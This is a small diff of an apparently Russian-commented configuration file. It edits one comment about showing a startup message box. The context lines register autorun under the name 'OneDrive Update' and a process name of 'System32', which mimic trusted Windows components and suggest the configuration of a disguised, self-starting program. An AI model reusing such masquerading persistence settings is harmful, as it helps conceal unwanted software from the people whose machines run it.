@@ -64,7 +64,7 @@ AutorunName = 'OneDrive Update'
 ProcessName = 'System32'
 
 
-#Выводить сообщение при запуске (True / False)
+#Выводить сообщение при запуске
 DisplayMessageBox = False
 #Заголовок сообщения
 MessageHeader = 'MessageHeader'
